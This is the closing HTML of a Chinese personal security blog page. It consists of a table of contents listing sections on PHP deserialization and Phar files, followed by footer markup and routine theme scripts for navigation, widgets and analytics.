class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="toc-number">1.1.1.</span> <span class="toc-text">名词解释</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E5%AD%901"><span class="toc-number">1.1.1.0.1.</span> <span class="toc-text">例子1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E5%AD%902"><span class="toc-number">1.1.1.0.2.</span> <span class="toc-text">例子2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E8%A7%A3%E9%87%8A"><span class="toc-number">1.1.2.</span> <span class="toc-text">字符解释</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.2.0.1.</span> <span class="toc-text">字符详解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#private%E5%92%8C-protected%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.2.0.2.</span> <span class="toc-text">private和 protected详解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.3.</span> <span class="toc-text">PHP常见魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#construct"><span class="toc-number">1.1.3.0.1.</span> <span class="toc-text">__construct</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#destruct"><span class="toc-number">1.1.3.0.2.</span> <span class="toc-text">__destruct</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#toString-NaN"><span class="toc-number">1.1.3.0.3.</span> <span class="toc-text">__toString</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#invoke"><span class="toc-number">1.1.3.0.4.</span> <span class="toc-text">__invoke</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#call"><span class="toc-number">1.1.3.0.5.</span> <span class="toc-text">__call</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sleep"><span class="toc-number">1.1.3.0.6.</span> <span class="toc-text">__sleep</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#wakeup"><span class="toc-number">1.1.3.0.7.</span> <span class="toc-text">__wakeup</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0"><span class="toc-number">1.1.4.</span> <span class="toc-text">PHP反序列化练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80-%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">一.初步认识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C-%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">二.简单利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89-%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">三.相关绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B-%E5%BC%80%E5%A7%8B%E4%B8%8A%E6%89%8B"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">四.开始上手</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phar%E6%96%87%E4%BB%B6%E5%92%8CPhar%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.5.</span> <span class="toc-text">Phar文件和Phar协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">phar文件详解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90phar%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">生成phar文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%87%86%E5%A4%87%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.5.3.1.</span> <span class="toc-text">1.准备环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.5.3.2.</span> <span class="toc-text">2.具体代码:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1%E8%AE%BF%E9%97%AEphar-php%E6%96%87%E4%BB%B6-%E7%94%9F%E6%88%90phar-phar%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.5.3.3.</span> <span class="toc-text">2.1访问phar.php文件,生成phar.phar文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2%E6%9F%A5%E7%9C%8Bphar%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.5.3.4.</span> <span class="toc-text">2.2查看phar文件内容</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">利用条件:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.4.1.</span> <span class="toc-text">文件操作函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.1.5.5.</span> <span class="toc-text">绕过技巧:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E9%99%90%E5%88%B6%E4%BA%86phar%E4%B8%8D%E8%83%BD%E5%87%BA%E7%8E%B0%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E9%87%8C"><span class="toc-number">1.1.5.5.1.</span> <span class="toc-text">1.环境限制了phar不能出现在前面的字符里</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E9%AA%8C%E8%AF%81%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.1.5.5.2.</span> <span class="toc-text">2.验证文件格式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E5%90%8E%E7%BC%80%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.5.5.3.</span> <span class="toc-text">3.绕过上传后缀检查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">1.1.5.6.</span> <span class="toc-text">练习</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80-%E5%88%9D%E6%AD%A5%E4%BA%86%E8%A7%A3"><span class="toc-number">1.1.5.6.1.</span> <span class="toc-text">一.初步了解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C-%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BA%86%E8%A7%A3"><span class="toc-number">1.1.5.6.2.</span> <span class="toc-text">二.进一步了解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-%E7%BB%83%E4%B9%A0"><span class="toc-number">1.1.5.6.2.1.</span> <span class="toc-text">拓展:练习</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89-%E5%86%8D%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BA%86%E8%A7%A3"><span class="toc-number">1.1.5.6.3.</span> <span class="toc-text">三.再进一步了解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.1.5.6.3.1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.1.5.6.3.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.1.5.6.3.3.</span> <span class="toc-text">解题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">1.1.5.7.</span> <span class="toc-text">反序列化漏洞的防御</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://s1.ax1x.com/2022/10/13/xdGtOg.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 木良</div><div class="footer_custom_text">(^_^)Hi,明天记得一起约奶茶哟!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="/js/weather.js"></script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><div class="aplayer no-destroy" data-id="8651145147" data-server="tencent" data-type="playlist" data-autoplay="true" data-fixed="true"   > </div><script src="/js/cebian.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/font_2264842_3izu8i5eoc2.js"></script><script async src="//at.alicdn.com/t/font_2032782_8ns648avijk.js"></script><script async src="/js/diytitle.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    var parent = document.getElementById('recent-posts');
+    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://www.webgg.ml/categories/SQL/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📚 木良のSQL (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.webgg.ml/categories/文件上传/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🎮 木良の文件上传 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.webgg.ml/categories/文件包含/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🐱‍👓 木良の文件包含 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.webgg.ml/categories/XSS/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">👩‍💻 木良のXSS (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.webgg.ml/categories/CSRF/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📒 木良のCSRF (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://www.webgg.ml/categories/SSRF/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">💡 木良のSSRF (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="https://www.webgg.ml/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
+    console.log('已挂载magnet')
+    parent.insertAdjacentHTML("afterbegin",child)}
+     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: #f2f2f2;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #b30070}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
+    <style></style><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><div id="ghbdages" style="overflow:hidden;max-height:90px;height:auto;text-align:center;margin-top:10px"><div class="swiper-wrapper"><div class="swiper-slide"><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="木良"><img src="https://img.shields.io/badge/店长:GG的Love-🤤草莓麻薯鲜奶茶🍓-ff69b4" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😮多肉葡萄🍇-blueviolet" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😇斑斓薄荷奶茶🍀-brightgreen" alt=""/></a></div><div class="swiper-slide"><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-🤩多肉葡萄冻🍇-9cf" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😮红豆相思奶茶-critical" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😮招牌芋圆奶茶🐠-lightgrey" alt=""/></a></div><div class="swiper-slide"><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-🤩生椰啵啵西瓜🍉-red" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-🤤草莓麻薯鲜奶茶🍓-ff69b4" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😮多肉葡萄🍇-blueviolet" alt=""/></a></div><div class="swiper-slide"><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😮红豆相思奶茶-critical" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-🤩生椰啵啵西瓜🍉-red" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-🤤草莓麻薯鲜奶茶🍓-ff69b4" alt=""/></a></div><div class="swiper-slide"><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😮红豆相思奶茶-critical" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😮招牌芋圆奶茶🐠-lightgrey" alt=""/></a><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😮多肉葡萄🍇-blueviolet" alt=""/></a></div><div class="swiper-slide"><a class="github-badge" target="_blank" href="https://www.webgg.ml/" style="margin-inline:5px" title="GG的Love"><img src="https://img.shields.io/badge/店长:GG的Love-😮红豆相思奶茶-critical" alt=""/></a></div></div></div><style>a.github-badge:hover:before {display:none}</style>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-footer-beautify/lib/swiperbdage_init.min.js"></script><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end --><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"position":"right","width":220,"height":290,"hOffset":10,"vOffset":-28},"mobile":{"show":true,"scale":1},"react":{"opacityDefault":0.3,"opacityOnHover":0.3,"opacity":0.98},"log":false});</script></body></html>
